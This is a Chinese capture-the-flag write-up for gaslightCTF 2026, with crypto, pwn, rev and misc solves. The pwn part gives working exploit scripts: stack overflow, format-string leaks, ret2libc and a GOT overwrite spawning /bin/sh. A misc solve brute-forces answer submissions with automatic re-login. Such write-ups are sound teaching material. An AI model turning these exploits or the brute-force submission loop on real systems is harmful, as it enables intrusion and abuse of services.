唯一附件是一段 242 字节的小写英文句子密文，末行是 flag 样式的字母数字串——
无源码、无密钥线索。词形模式侦察（`vqlf'z` 形如 `????'?`、单字母词 `O`）确认
是单表替换族；先手动猜 `tcqhgkqzogf=information` 发现重复字母位矛盾，排除
手工路径。上模拟退火：Project Gutenberg 语料构建 quadgram + 词频模型，40 万轮
置换搜索，收敛出 95% 正确的明文（"our friend from paris examined his empty
glass..."），逐词对齐出完整映射——然后才发现映射的真面目是 **QWERTY 键盘
替换**（明文字母按字母序位置取键盘序同下标字母，`q→a, w→b, e→c...`）。
flag 行 `0w5exk1zn-41fz-f0z-l3exkozn` 数字保留、字母同一映射解出
"obscurity aint not security"——flag 内容本身就是安全格言彩蛋。

<details>
<summary>📜 no-info solve.py（33 行，映射求解后的最终版）——点击展开</summary>

```python
#!/usr/bin/env python3
"""gaslightCTF 2026 - no-info (crypto)

The ciphertext is a monoalphabetic substitution where each plaintext letter is
replaced by the letter at the same index in the QWERTY keyboard order:
    plaintext  alphabet: a b c d e f g h i j k l m n o p q r s t u v w x y z
    ciphertext (QWERTY): q w e r t y u i o p a s d f g h j k l z x c v b n m
Digits/punctuation pass through unchanged.
"""
import re
import sys

QWERTY = "qwertyuiopasdfghjklzxcvbnm"
ALPHA = "abcdefghijklmnopqrstuvwxyz"
ENC = str.maketrans(ALPHA, QWERTY)   # plaintext -> ciphertext
DEC = str.maketrans(QWERTY, ALPHA)   # ciphertext -> plaintext

def main():
    ct = open(sys.argv[1] if len(sys.argv) > 1 else "output.txt").read().strip()
    print("=== decrypted text ===")
    print(ct.lower().translate(DEC))

    # the flag line: last line, digits kept, letters encrypted
    flag_line = [ln for ln in ct.splitlines() if ln.strip()][-1]
    inner = flag_line.lower().translate(DEC)
    print("\n=== decrypted flag line ===")
    print(inner)
    flag = "gaslightCTF{" + inner + "}"
    print("\nFLAG:", flag)
    return flag

if __name__ == "__main__":
    main()
```

</details>

<details>
<summary>📜 no-info solve_sub.py 退火核心（15 行节选，全文 79 行）——点击展开</summary>

```python
T = 3.0
random.seed(42)
alpha = list(letters_alpha)
for it in range(400000):
    T = 3.0 * (0.9997 ** it)
    a, b = random.sample(alpha, 2)
    # swap plaintext values of a,b in perm
    pa, pb = perm[a], perm[b]
    perm[a], perm[b] = pb, pa
    ns = score(perm)
    if ns > best_score or random.random() < math.exp((ns - best_score)/T):
        if ns > best_score:
            best_score = ns; best_perm = dict(perm)
    else:
        perm[a], perm[b] = pa, pb
```

</details>

**Where the dream starts 3（404）— 位置递增的 Vigenère，先消位置项**
**Flag**：`gaslightCTF{theindecipherablecipher}`

同家族第三作：`ct[i] = (pt[i] + key[i%m] + (i//m)) % 26`，比标准 Vigenère 多了
一个位置递增项，题面点名 Friedman 与 Kasiski。Kasiski 三连字重复间隔 gcd=1，
长文本重复片段太稀疏，此路不通。转 IC：**对每个候选 m 先减去已知项 `i//m`**，
剩下的 `d[i] = pt[i] + key[i%m]` 是纯 Vigenère——这一步把"密钥周期"与"位置
递增"解耦。按余数类分组算 IC，m=5 峰值 0.0608（英文 IC≈0.065），其余 m 全在
0.034–0.048。m 定了之后每个 key 位对 26 个候选字母做卡方拟合（期望分布=英文
词频），逐位解出 `d r e a m`——与标题呼应。明文是 Kekulé 苯环结构之梦的著名
自述，结尾一句自述 flag："the flag is the indecipherable cipher"（Vigenère 的
历史绰号 le chiffre indéchiffrable）。

<details>
<summary>📜 where-the-dream-starts-3 solve.py（72 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""Where the dream starts 3 — solve script.

Cipher: ct[i] = (pt[i] + key[i % m] + (i // m)) % 26   (m and key unknown)

Plan:
1. Guess m by Friedman's index of coincidence on d[i] = ct[i] - (i//m) mod 26.
   Correct m makes each residue class a monoalphabetic substitution of English
   -> average IC ~0.065.  Here m = 5 (IC 0.0608).
2. With m fixed, d[i] = pt[i] + key[i % m] is plain Vigenere; solve each key
   position by chi-squared fit against English letter frequencies.
   -> key = "dream"
3. Decrypt and read the plaintext; the flag statement is in the plaintext.
"""
from string import ascii_lowercase
from collections import Counter
import math

ct = open('output.txt').read().strip()
n = len(ct)
cvals = [ascii_lowercase.index(c) for c in ct]

# --- step 1: find key length via Friedman IC ---
def ic(vals):
    cnt = Counter(vals)
    L = len(vals)
    if L < 2:
        return 0.0
    return sum(v * (v - 1) for v in cnt.values()) / (L * (L - 1))

best = (0, None)
for m in range(1, 61):
    groups = [[] for _ in range(m)]
    for i in range(n):
        groups[i % m].append((cvals[i] - (i // m)) % 26)
    avg = sum(ic(g) for g in groups) / m
    if avg > best[0]:
        best = (avg, m)
m = best[1]
print(f'key length m = {m}  (avg IC = {best[0]:.4f})')

# --- step 2: solve Vigenere key by chi-squared ---
FREQ = {'e': 12.7, 't': 9.06, 'a': 8.17, 'o': 7.51, 'i': 6.97, 'n': 6.75,
        's': 6.33, 'h': 6.09, 'r': 5.99, 'd': 4.25, 'l': 4.03, 'c': 2.78,
        'u': 2.76, 'm': 2.41, 'w': 2.36, 'f': 2.23, 'g': 2.02, 'y': 1.97,
        'p': 1.93, 'b': 1.49, 'v': 0.98, 'k': 0.77, 'j': 0.15, 'x': 0.15,
        'q': 0.10, 'z': 0.07}

d = [(cvals[i] - (i // m)) % 26 for i in range(n)]

def chi2(vals, k):
    dec = [(v - k) % 26 for v in vals]
    cnt = Counter(dec)
    L = len(vals)
    return sum((cnt.get(ascii_lowercase.index(ch), 0) - L * p / 100) ** 2 / (L * p / 100)
               for ch, p in FREQ.items())

key = []
for j in range(m):
    vals = [d[i] for i in range(j, n, m)]
    key.append(min(range(26), key=lambda k: chi2(vals, k)))
keyword = ''.join(ascii_lowercase[k] for k in key)
print(f'keyword = "{keyword}"')

# --- step 3: decrypt ---
pt = ''.join(ascii_lowercase[(d[i] - key[i % m]) % 26] for i in range(n))
print(pt)

# flag statement in the plaintext
i = pt.find('theflagis')
print('\nflag hint:', pt[i:])
print('FLAG = gaslightCTF{' + pt[i + len('theflagis'):] + '}')
```

</details>

### Pwn（5/5）

**ram-conservation（354）— glob 传参 + uudecode 写文件**
**Flag**：`gaslightCTF{b3w4r3_th3_r4mp0calys3_fc1a12d25fe6}`

受限 shell 只执行输入的第一个词（空格/TAB 都拆），还过滤危险命令。三条小
事实拼成链：`$cmd` 不带引号时 glob 在展开阶段生效，能把文件名当参数传；
`uudecode` 的 `begin 755 x` 头 mode 可控，能从 stdin 写出可执行文件；bash 对
"有 x 位但不是二进制"的文件自动当脚本解释（ENOEXEC 回退）。执行本地文件要写
`./x`——bash 的 PATH 查找不含 cwd，这是调试时踩过的坑。

<details>
<summary>📜 ram-conservation 最小 POC（3 行）——点击展开</summary>

```python
payload = uuencode(script, 0o755, "x")     # 把 bash 脚本 uu 编码
s.sendall(b"uudecode\n"); s.sendall(payload)
s.sendall(b"./x\n")                        # 执行（PATH 里没有 cwd，要 ./）
```

</details>

**badcat（447）— setuid cat 的 fd 复用**
**Flag**：`gaslightCTF{f3l1n3_d3scr1pt0r_m30www_4d08bc16c461}`

`/bin/badcat` 是 setuid root 的 cat。对着"peek 硬编码读 8 字节"找了一下午
内存破坏无果，回退到"程序有哪些系统调用、谁改变了什么全局状态"的清单式排查
才看到真相是 **fd 生命周期**：`slurp(0)` 读完 stdin 会 `close(0)`；`/flag`
的 root `open()` 拿到最低空闲 fd=0 且**从不 close**，读 8 字节后偏移停在 8。
于是 `-` 关 0 → `/flag` 让 root open 抢到 fd 0（读 8 字节）→ 再 `-` 从偏移 8
把剩余 43 字节读出来。权限只在 open 时校验，已开的 fd 降权后照读。

<details>
<summary>📜 badcat 最小 POC（3 行）——点击展开</summary>

```bash
badcat - /flag - < /dev/null
# psst, here's a sneak peek: gaslight
# CTF{f3l1n3_d3scr1pt0r_m30www_4d08bc16c461}
```

</details>

**good-enough（453）— gut genug：gets 溢出 + ret 对齐**
**Flag**：`gaslightCTF{du_b1st_gut_g3nuuuuu_uuuuu_uuug_fb1ffbe73405}`

第二轮 pwn 开门题，"有源码 pwn 标准链"：泄漏 → 计算 → 单发 payload。`main`
第一条 `printf("[%p] du bist? ", main)` 直接泄漏 PIE 基址；`gets` 读入
`rbp-0x10` 的 16 字节栈缓冲（无 canary），24 字节改写 saved RIP。两个坑：
`strncmp(buf, "gut genug", 9)` 校验 payload **前 9 字节**——payload 开头必须
拼合法前缀（与题名 "good enough" 呼应）；直接跳 `win()` 时远程在 `system`
处静默断开——经典 movaps 栈对齐崩溃，payload 里先垫一个裸 `ret` gadget 对齐。
（本地 qemu-user 里 lazy PLT binding 会崩是模拟器伪影，`LD_BIND_NOW=1` 正常。）

<details>
<summary>📜 good-enough solve.py（86 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""
gaslightCTF 2026 - good-enough (pwn, 453)

Vuln: gets() stack overflow into a 16-byte buffer (no canary, PIE).
Gate: strncmp(buf, "gut genug", 9) must pass on the FIRST 9 bytes -> prefix payload
      with "gut genug".
Leak: main() prints printf("[%%p] du bist? ", main) -> PIE base leak.
Win:  win() at offset 0x1228 calls system("/bin/sh").

Payload layout (gets writes from rbp-0x10):
  buf[0:16] = "gut genug" + 7 junk
  rbp[16:24] = junk
  rip[24:32] = win

Usage: ./solve.py [host] [port]   (defaults to local process)
"""
import re
import sys

from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = None
PORT = None
SSL = False
if len(sys.argv) >= 3:
    HOST, PORT = sys.argv[1], int(sys.argv[2])
if len(sys.argv) >= 4 and sys.argv[3] == "ssl":
    SSL = True

BIN = "./good-enough"
MAIN_OFF = 0x1179
RET_OFF = 0x10E8   # ret gadget (deregister_tm_clones+0x28) for stack alignment
WIN_OFF = 0x1228


def main():
    if HOST:
        io = remote(HOST, PORT, ssl=SSL)
    else:
        io = process(BIN)

    # 1. grab the leak: "[<main addr>] du bist? " (no trailing newline)
    banner = io.recvuntil(b"du bist? ", timeout=8)
    log.info("banner: %r", banner)
    m = re.search(rb"\[(0x[0-9a-f]+)\]", banner)
    assert m, "no leak found"
    main_addr = int(m.group(1), 16)
    base = main_addr - MAIN_OFF
    ret = base + RET_OFF
    win = base + WIN_OFF
    log.success("main @ %#x, base @ %#x, ret @ %#x, win @ %#x", main_addr, base, ret, win)

    # 2. overflow: "gut genug" must be the first 9 bytes for strncmp to pass.
    #    ret gadget first aligns rsp for system() (avoids movaps crash in glibc).
    payload = b"gut genug" + b"A" * 7  # 16 bytes fill buffer
    payload += b"B" * 8                 # saved rbp
    payload += p64(ret)                 # saved rip -> ret gadget
    payload += p64(win)                 # -> win(): system("/bin/sh")
    log.info("payload (%d bytes): %r", len(payload), payload)
    io.sendline(payload)

    io.recvuntil(b"bleib einfach nur du", timeout=3)
    log.success("check passed, jumping to win()")

    # 3. shell
    if HOST:
        io.sendline(b"cat flag.txt; cat /flag; ls -la")
    else:
        io.sendline(b"cat flag.txt 2>/dev/null; id")
    try:
        io.sendline(b"echo PWNED_MARKER")
        out = io.recvall(timeout=5)
        log.info("output:\n%s", out.decode(errors="replace"))
        if b"PWNED_MARKER" in out:
            log.success("got shell")
    except Exception as e:
        log.warning("recv issue: %s", e)
    io.close()


if __name__ == "__main__":
    main()
```

</details>

**ucas（470）— `\x00\n` 让 strlen 恒 0：字数门禁是纸老虎**
**Flag**：`gaslightCTF{m4n1f3st1ng_e4sy_0ff3r5_f0r_ev3ry0n3_c2e6b547e8b1}`

"UCAS 申请文书"三连问，`printf(name)` 直接把 15 字符姓名当格式串——
`%513$p%515$p` 恰好 14 字符，canary（0x...00 结尾特征定位槽位）与 libc 返回
地址一次到手。真正的转折在"字数门禁"：essay 用 `fgets(buf, 0xfa0 - counter)`
限长、`counter += strlen(essay)` 计数，而 **fgets 读原始字节、strlen 遇 `\0`
截断**——发 `\x00\n` 让 strlen 恒为 0，counter 永不增长，三段 essay 的 fgets
大小全部保持 0xfa0。essay3 缓冲只有 0x540，0xfa0 直接写穿 canary 和 saved RIP，
ret2libc 收尾。（payload 里出现 `0x0a` 会被 fgets 截断，脚本自动重连重试，
概率约 3%/次。）

<details>
<summary>📜 ucas solve.py（104 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""
gaslightCTF 2026 - ucas (pwn, ~470)

Vuln 1: printf(name) format string with a 16-byte name (fgets 0x10).
         -> leaks: %513$p = stack canary, %515$p = ret addr into
            __libc_start_call_main+0x75 (libc base = leak - 0x2b285).
Vuln 2: essays read with fgets(essay_i, 0xfa0 - counter) where
         counter += strlen(essay).  Sending "\x00\n" makes strlen == 0, so the
         counter never grows and EVERY essay fgets still gets size 0xfa0.
         essay3's buffer is at rbp-0x540, so 0xfa0 bytes overflow way past
         the canary (rbp-0x8, offset 0x538) and saved RIP -> ret2libc.
Gate:   the "too long" counter check is bypassed (counter stays ~1336) and
        main returns normally (canary restored), landing in our ROP chain.

Usage:  ./solve.py <host> <port> [ssl]
        ./solve.py                          # local wrapper demo (127.0.0.1:19999)
"""
import re
import sys
import time

from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT, SSL = None, None, False
if len(sys.argv) >= 3:
    HOST, PORT = sys.argv[1], int(sys.argv[2])
if len(sys.argv) >= 4 and sys.argv[3] == "ssl":
    SSL = True

LIBC = "libc.so.6"
libc = ELF(LIBC)
SYSTEM = libc.symbols["system"]          # 0x58860
BINSH = next(libc.search(b"/bin/sh"))    # 0x1c3ed9
POP_RDI = 0xFC08D                        # pop rdi; ret
RET = 0x2930B                            # plain ret (stack alignment)
LIBC_RET_OFF = 0x2B285                   # ret after `call main` in __libc_start_call_main
CANARY_POS, LIBCRET_POS = 513, 515       # format-string arg positions
OFFSET = 0x538                           # essay3 buf (rbp-0x540) -> canary (rbp-0x8)


def attempt():
    if HOST:
        io = remote(HOST, PORT, ssl=SSL, timeout=8)
    else:
        io = remote("127.0.0.1", 19999, timeout=8)

    io.recvuntil(b"please enter your name: ", timeout=6)
    io.sendline(b"%513$p%515$p")                       # 14 bytes: canary + libc ret
    b = io.recvuntil(b"Why do you want", timeout=6)
    m = re.search(rb"welcome, (0x[0-9a-f]+)(0x[0-9a-f]+)", b)
    if not m:
        log.warning("leak parse failed: %r", b[:120])
        io.close()
        return None
    canary = int(m.group(1), 16)
    libc_base = int(m.group(2), 16) - LIBC_RET_OFF
    log.success("canary=%#x libc=%#x", canary, libc_base)

    chain = p64(libc_base + POP_RDI) + p64(libc_base + BINSH) \
          + p64(libc_base + RET) + p64(libc_base + SYSTEM)
    payload = b"A" * OFFSET + p64(canary) + b"B" * 8 + chain
    if b"\n" in payload:                               # fgets would truncate
        log.warning("0x0a byte in payload (canary), retrying new conn")
        io.close()
        return None

    io.send(b"\x00\n")                                 # essay1: strlen == 0
    io.recvuntil(b"How have your qualifications", timeout=5)
    io.send(b"\x00\n")                                 # essay2: strlen == 0
    io.recvuntil(b"What else have you done", timeout=5)
    io.send(payload + b"\n")                           # essay3: overflow
    io.recvuntil(b"clearing", timeout=6)
    io.sendline(b"echo PWNED_MARKER; cat flag; cat flag.txt; cat /flag; ls -la")
    try:
        out = io.recvall(timeout=6)
    except Exception as e:
        out = b""
    io.close()
    return out


def main():
    for i in range(8):
        out = attempt()
        if out is None:
            continue
        log.info("out:\n%s", out.decode(errors="replace"))
        if b"PWNED_MARKER" in out:
            log.success("got shell")
            m = re.search(rb"gaslightCTF\{[^}]+\}", out)
            if m:
                log.success("FLAG: %s", m.group(0).decode())
            sys.exit(0)
        time.sleep(1)
    log.failure("exploit failed after retries")
    sys.exit(1)


if __name__ == "__main__":
    main()
```

</details>

**thirds（486）— 改 saved RIP 重进 main：格式串三轮不够就再来三轮**
**Flag**：`gaslightCTF{th1rd_t1m35_th3_ch4rm_1b807eeed8b1}`

全场 pwn 压轴。三连 `fgets(buf, 0x10)` + `printf(buf)`，无栈溢出，每轮只有
15 字节可用。三个 printf 调用点 rsp 恒为 `rbp-0x40`，槽位映射完全相同
（`%8$=buf2[0:8]`、`%13$=canary`、`%15$=saved RIP(libc+0x2b285)`、`%19$=main
指针`），远程泄漏直接证实。根本死结是**最后一个 printf 之后没有触发点**——
直接改 printf@GOT 后没有下一次 printf 帮你调 system。破局：第一轮用
`%8$hn` 把 saved RIP 低 16 位改到 `call [rbp-0x78]`（`libc+0x2b282`），main
返回时**重新调用 main**（call 会把 0x2b285 重新压回 saved RIP 槽，第二轮
结束后进程正常退出）；第二轮再用 `%6$hn` 写 printf@GOT → system，紧随的
`printf("3> ")` 变 `system("3> ")`（sh 语法错误无害），第三轮输入 `/bin/sh`
触发 `system("/bin/sh")`。

四个实战坑每个都值得记：① 泄漏输出后紧跟 `2> ` 提示符，贪婪正则会把提示符
的 `2` 吞进 V 的低半字节（saved rbp 16 对齐，`v >>= 4` 校验兜底）；② `%hn`
只能写目标低 16 位，落在 saved RIP 自己的 64K 窗口内，N 必须按
`(libc+0x2b282)&0xffff` 算进位，不是常数 0xb282；③ printf 与 system
（0x5fb80 / 0x58860）只有落在**同一 64K 窗口**时低 16 位改写才成立——依赖
libc 基址低 16 位，约 55% 连接命中，不命中直接重连（ASLR 每次变化）；④
平台 TLS 负载均衡**按 SNI 路由**，pwntools `ssl=True` 不发 SNI 直接被断，
必须 `server_hostname=<实例域名>` 手工握手；`%Nc` 填充的 3~5 万空格先于一切
输出，recv 要持续排空到超时。

<details>
<summary>📜 thirds solve.py（节选 129 行，全文 270 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""
gaslightCTF 2026 - thirds (pwn, ~486)

Binary: 3 rounds of fgets(buf, 0x10) + printf(buf), bufs at rbp-0x40/-0x30/-0x20.
At EVERY printf call site rsp = rbp-0x40, so the stack positional args are:
  %6$  = buf1[0:8]   %7$  = buf1[8:16]   %8$  = buf2[0:8]   %9$  = buf2[8:16]
  %10$ = buf3[0:8]   %11$ = buf3[8:16]   %13$ = canary      %14$ = saved rbp (V)
  %15$ = saved RIP (libc+0x2b285)        %19$ = main ptr (PIE+0x1159)
(verified remotely: %15$p%19$p%14$p leaks libc/pie/V with handout offsets)

libc frame (glibc 2.42 handout): __libc_start_call_main does
  push rbp; mov rbp,rsp; sub rsp,0x90; ...; call [rbp-0x78]   ; call main
  ...  0x2b285: mov edi,eax / call exit
so main_rbp = V - 0xA0 and the saved-RIP slot is at V - 0x98.

Attack (format-string only, no overflow):
  Run 1:
    R1: buf1 = "%15$p%19$p%14$p"            -> leak libc, PIE, saved rbp V
    R2: buf2 = p64(V-0x98) + filler         (write target = saved RIP address)
    R3: buf3 = "%8$45698c%8$hn"             -> saved RIP low16 := 0xb282
        main returns -> ret to libc+0x2b282 (`call [rbp-0x78]`) -> main runs AGAIN
        (the call re-pushes 0x2b285 into the saved-RIP slot, so run 2 exits
         normally afterwards - we have our shell by then)
  Run 2:
    R1: buf1 = p64(printf@got) + filler     (target for %6$ at printf(buf2))
    R2: buf2 = "%6$34912c%6$hn"             -> printf@GOT low16 := 0x8860
        (system 0x58860 / printf 0x5fb80 share bytes 2+)
    then printf("3> ") = system("3> ")      (syntax error, harmless)
    R3: buf3 = "/bin/sh\x00" -> printf(buf3) = system("/bin/sh") -> SHELL

Note: the platform LB routes by TLS SNI - connect with server_hostname=host.

Usage: ./solve.py <host> <port> [--probe]
"""
SYSTEM_OFF = 0x58860
PRINTF_OFF = 0x5fb80
RET_OFF = 0x2b285            # ret after `call main` in __libc_start_call_main
MAIN_OFF = 0x1159
PRINTF_GOT_OFF = 0x4008
LOOP_RIP = 0xb282             # low16 of libc+0x2b282 (call [rbp-0x78] -> main)

# ……（省略 Conn：带 SSL+SNI 的缓冲 socket 封装——pwntools ssl=True 不发 SNI，
#     平台 LB 按 SNI 路由，必须 server_hostname=host 手工握手）……


def send_chunk(io, data):
    """fgets(buf,0x10): reads up to 15 bytes, stops at \n; NUL-terminates.
    A chunk shorter than 15 bytes must end with \n to be consumed fully."""
    if len(data) >= 15:
        assert len(data) == 15, "chunk too long: %d" % len(data)
        io.send(data)
    else:
        io.send(data + b"\n")


def round1_leak(io):
    io.recvuntil(b"1> ", timeout=8)
    send_chunk(io, b"%15$p%19$p%14$p")          # exactly 15 bytes
    line = io.recvuntil(b"\n", timeout=8)
    m = re.search(rb"0x([0-9a-f]+)0x([0-9a-f]+)0x([0-9a-f]+)", line)
    if not m:
        print("[!] leak parse failed: %r" % line)
        return None
    ret_leak = int(m.group(1), 16)
    main_leak = int(m.group(2), 16)
    v = int(m.group(3), 16)
    # The leak is printed directly before the "2> " prompt; the greedy regex
    # swallows the prompt's '2' as the last hex nibble of V. saved rbp is
    # 16-aligned, so drop the bogus low nibble.
    v >>= 4
    libc = ret_leak - RET_OFF
    pie = main_leak - MAIN_OFF
    if libc & 0xfff or pie & 0xfff or v & 0xf:
        print("[!] leaks not aligned: libc=%#x pie=%#x V=%#x" % (libc, pie, v))
        return None
    return dict(libc=libc, pie=pie, v=v)


# ……（省略 probe：用 %8$s 读 printf@GOT 验证远程 libc 与 handout 一致）……


def exploit(io, do_probe=False):
    leaks = round1_leak(io)
    if not leaks:
        return False
    libc, pie, v = leaks["libc"], leaks["pie"], leaks["v"]
    system = libc + SYSTEM_OFF
    printf_got = pie + PRINTF_GOT_OFF
    print("[*] libc=%#x pie=%#x V=%#x system=%#x printf@got=%#x"
          % (libc, pie, v, system, printf_got))

    saved_rip_addr = v - 0x98
    if any(b == 0x0a for b in p64(saved_rip_addr)):
        print("[!] saved_rip_addr %#x contains \\n byte - retry" % saved_rip_addr)
        return False
    # printf@GOT low16-write can only reach addresses in printf's own 64K
    # window; system must share that window (depends on libc base low16).
    if ((libc + PRINTF_OFF) & ~0xffff) != ((libc + SYSTEM_OFF) & ~0xffff):
        print("[!] printf/system in different 64K windows - retry (base&0xffff=%#x)"
              % (libc & 0xffff))
        return False

    # ---- run 1, round 2: place write target (saved RIP addr) in buf2 ----
    io.recvuntil(b"2> ", timeout=8)
    send_chunk(io, p64(saved_rip_addr) + b"A" * 7)

    # ---- run 1, round 3: saved RIP low16 := (libc+0x2b282)&0xffff -> re-enter main ----
    loop_rip = (libc + 0x2b282) & 0xffff
    io.recvuntil(b"3> ", timeout=15)     # swallows padding too
    send_chunk(io, b"%%8$%dc%%8$hn" % loop_rip)

    # ---- run 2, round 1: buf1 = target for %6$ at printf(buf2) ----
    io.recvuntil(b"1> ", timeout=15)
    send_chunk(io, p64(printf_got) + b"A" * 7)

    # ---- run 2, round 2: printf@GOT low16 := system low16 ----
    io.recvuntil(b"2> ", timeout=15)
    send_chunk(io, b"%%6$%dc%%6$hn" % (system & 0xffff))
    # printf("3> ") is now system("3> ") -> sh syntax error, returns

    # ---- run 2, round 3: printf(buf3) = system("/bin/sh") ----
    time.sleep(0.6)
    send_chunk(io, b"/bin/sh\x00")       # fgets reads 9 bytes incl the \n
    time.sleep(0.6)
    io.sendline(b"echo PWNED; id; cat flag; cat /flag; ls -la")
    out = io.recv(timeout=6)
    print("[*] shell output: %r" % out[:600])
    return b"PWNED" in out
```

</details>

### Rev（2/2）

**Compiled Source Sheets（290）— 从 CSS 变量里提取 ROM**
**Flag**：`gaslightCTF{ch3ck_0ut_lyra-horse!!_2QY90H6F}`

一个纯 CSS 的 8086 模拟器（x86CSS），程序机器码以 `--__1m<addr>: <val>` CSS
变量存储。非常规载体的第一步是找到编码规则：正则提取变量还原 ROM，capstone
反汇编 8086，程序对 flag 逐字节校验（xor/and/or 与常量比较）。校验类程序
别手工推——校验关系全部喂给 z3。

<details>
<summary>📜 compiled-source-sheets 最小 POC（7 行）——点击展开</summary>

```python
from z3 import *
inp = [BitVec(f"b{i}", 8) for i in range(9)]
s = Solver()
for a, b, c in checks:          # 从反汇编提取的校验约束
    s.add((inp[a] ^ inp[b]) & 0xFF == c)
s.check(); m = s.model()
print("gaslightCTF{ch3ck_0ut_lyra-horse!!_" + bytes(m.eval(x).as_long() for x in inp).decode() + "}")
```

</details>

**ohfrick（423）— 插桩 eval/exec：526 次小 eval 的自白**
**Flag**：`gaslightCTF{e50t3r1c_sn4k3}`

62KB 单行的 Python 版 JSFuck 混淆。不硬反混淆——**动态插桩 > 静态还原**：
包装 `eval`/`exec` 记录每一层求值字符串，比人肉还原省一个数量级。两个转折：
① 顶层结构是 `eval(EXPR)(10)`——外层 eval 的结果是**可调用对象**，直接把它
换成 `print(` 会得到 `None(...)` 报错；② 只包装 eval 拿不到源码——完整链路上
**526 次 eval 全是 2~8 字符的小片段**（`'float'`、`'[].clear'`、`'chr'`），
真正的 357 字符校验程序是最后通过 `exec(S)` 一次性执行的。包装对象的
`__repr__` 要和真 builtin 完全一致（`<built-in function eval>`），否则
`str(eval)[i]` 取字符的路径全断。捕获校验源码后逐条解约束：`int(f[1:3])==50`、
`"reset"==f[5]+f[0]+f[9]+f[0]+f[3]`、`str(credits).strip()[4:6]=="ks"`（credits
是 Python 内置版权常量）……得到 `e50t3r1c_sn4k3`（leet 的 "esoteric_snake"，
与题名 ohfrick 的 esoteric Python 呼应）。校验器约束不足——穷举出 8 个合法
输入，7 个是数字变体乱码，语义完整的那个显然是作者存的；平台 flag 统一带
`gaslightCTF{}` 前缀，裸 14 字符被拒。

<details>
<summary>📜 ohfrick solve.py（112 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""gaslightCTF 2026 - ohfrick (rev, 423pts) one-shot solver.

code.py is a Python "JSFuck" style obfuscation: a single eval(EXPR)(10) chain
of tiny eval() calls building the real checker program character by character,
finally executed via exec().  Steps:

1. Wrap builtins.eval/exec with loggers (repr of the wrapper matches the real
   builtin so all str(eval)[i] char-extraction still works) -> captures the
   deobfuscated checker source.
2. Parse the checker constraints and brute-force the few unknown flag chars.

Flag: gaslightCTF{e50t3r1c_sn4k3}  (leet for "esoteric_snake"; the checker
asserts len(flag)==14 so it verifies the inner 14 chars, but the platform
stores the standard gaslightCTF{...} form -- submit with the prefix)
"""
import builtins
import itertools
import re
import sys
from pathlib import Path

HERE = Path(__file__).parent
SRC = HERE / "code.py"


def deobfuscate() -> str:
    real_eval = builtins.eval
    real_exec = builtins.exec
    captured = []

    class WrappedEval:
        def __repr__(self):
            return "<built-in function eval>"

        def __call__(self, code, *args, **kwargs):
            return real_eval(code, *args, **kwargs)

    class WrappedExec:
        def __repr__(self):
            return "<built-in function exec>"

        def __call__(self, code, *args, **kwargs):
            captured.append(str(code))
            return real_exec(code, *args, **kwargs)

    builtins.eval = WrappedEval()
    builtins.exec = WrappedExec()
    builtins.input = lambda prompt="": "A" * 14  # probe; fails at 2nd assert
    try:
        real_exec(compile(SRC.read_text(), "<obf>", "exec"),
                  {"__builtins__": builtins.__dict__})
    except Exception:
        pass  # probe flag intentionally fails an assert
    finally:
        builtins.eval = real_eval
        builtins.exec = real_exec
        builtins.input = input
    assert captured, "failed to capture checker source"
    return captured[0]


def solve() -> str:
    src = deobfuscate()
    # The captured checker (whitespace varies): keep the constraint lines.
    lines = [ln for ln in src.splitlines() if ln.strip().startswith(("T=", "F="))]
    assert len(lines) == 2, f"unexpected checker: {lines}"
    T, F = lines

    def check(f: str) -> bool:
        i, o = int, ord
        ns = {"f": f, "i": i, "o": o, "credits": credits,
              "T": None, "F": None, "str": str, "int": int, "ord": ord}
        try:
            exec(T.replace("T=", "T="), ns)
            exec(F.replace("F=", "F="), ns)
        except Exception:
            return False  # invalid candidate (index out of range / bad int)
        return all(ns["T"]) and not any(ns["F"])

    # brute force the 5 unknown positions (4,6,10,11,13): digits/leet chars
    sols = []
    for d4, d6, c10, d11, d13 in itertools.product(
            "0123456789", "123456789", "noN0123456789", "0123456789", "0123456789"):
        f = list("e50t?r?c_s??k?")
        f[4], f[6], f[10], f[11], f[13] = d4, d6, c10, d11, d13
        f = "".join(f)
        if check(f):
            sols.append(f)
    # The checker is under-constrained: 8 digit-variant flags pass. The
    # intended one spells "esoteric_snake" in leet (e50t3r1c_sn4k3) -- the
    # challenge is called "ohfrick", i.e. esoteric Python. Prefer it.
    intended = "e50t3r1c_sn4k3"
    if intended in sols:
        return intended
    if sols:
        return sols[0]
    raise RuntimeError("no flag found")


if __name__ == "__main__":
    inner = solve()
    flag = f"gaslightCTF{{{inner}}}"
    print(f"flag: {flag}")
    print(f"(checker core: {inner})")
    # end-to-end verification against the original obfuscated file (it
    # verifies the 14-char core; the platform accepts the prefixed form)
    import subprocess
    p = subprocess.run([sys.executable, str(SRC)], input=inner + "\n",
                       capture_output=True, text=True, timeout=120)
    assert "ok" in p.stdout, f"verification failed: {p.stdout!r} {p.stderr!r}"
    print("verified against original code.py: prints 'ok'")
```

</details>

### Misc（4/10）

**Sanity Check（100）**
**Flag**：`gaslightCTF{w3lc0me_2_g4sl1ghtCTF!}`

平台/队伍信息里的热身 flag。

**odyssey（410）— 图搜 + 坐标盲试**
**Flag**：`gaslightCTF{37.974,23.724}`（官方答案 `gaslightCTF{37.973,23.726}`）

无 GPS 的雅典照片（iPhone HEIC，darktable 调色导出）。GLM 做了前期 OSINT，
DeepSeek 用 Yandex 图搜（Smart Camera 上传图返回文字标签 "the acropolis
athens"）锁定"卫城北侧街区"，然后网格串行盲试（每次提交 sleep 10s、不并发，
平台会过期登录态，脚本自动重登），110 格里第 27 次 `37.974,23.724` 被平台
接受。官方答案是画面中景的 Canellopoulos Museum（37.9729473,23.7260968 →
`37.973,23.726`）——我们错把"画面主体的坐标"当成了"摄影机位的坐标"，
问题定义漂移的代价见「反思」章。

![](odyssey-photo.jpg)

<details>
<summary>📜 odyssey 盲试核心（5 行）——点击展开</summary>

```python
# 盲试核心：网格按距离排序，串行提交，命中即停
for lat, lon in sorted(grid, key=lambda c: dist(c, (37.973, 23.727))):
    if submit(f"gaslightCTF{{{lat},{lon}}}"):
        print("FOUND", lat, lon); break
    time.sleep(10)
```

</details>

**jsbox（310）— 原型方法拿真实源码**
